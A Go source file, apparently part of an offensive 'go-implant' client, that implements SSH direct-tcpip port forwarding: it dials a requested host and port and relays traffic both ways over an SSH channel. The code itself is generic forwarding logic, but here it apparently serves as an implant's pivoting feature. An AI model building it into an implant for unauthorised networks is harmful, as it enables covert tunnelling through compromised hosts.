package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"

	"golang.org/x/crypto/ssh"
)

// DirectTcpipOpenRequest is a struct to hold extradata regarding port forwards
type DirectTcpipOpenRequest struct {
	HostToConnect       string
	PortToConnect       uint32
	OriginatorIPAddress string
	OriginatorPort      uint32
}

// ServePortForward is a function to forward traffic coming from channel to host:port
func ServePortForward(connection ssh.Channel, host string, port int) {

	// Connect to remote host
	remote, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	if err != nil {
		connection.Close()
		if config.DEBUG {
			log.Println(err)
		}
		return
	}

	defer remote.Close()

	chDone := make(chan bool)

	// Start connection -> remote data transfer
	go func() {
		_, err := io.Copy(connection, remote)
		if config.DEBUG {
			if err != nil {
				log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
			}
		}
		chDone <- true
	}()

	// Start remote -> connection data transfer
	go func() {
		_, err := io.Copy(remote, connection)
		if err != nil {
			if config.DEBUG {
				log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
			}
		}
		chDone <- true
	}()

	<-chDone // block until copying returns
}
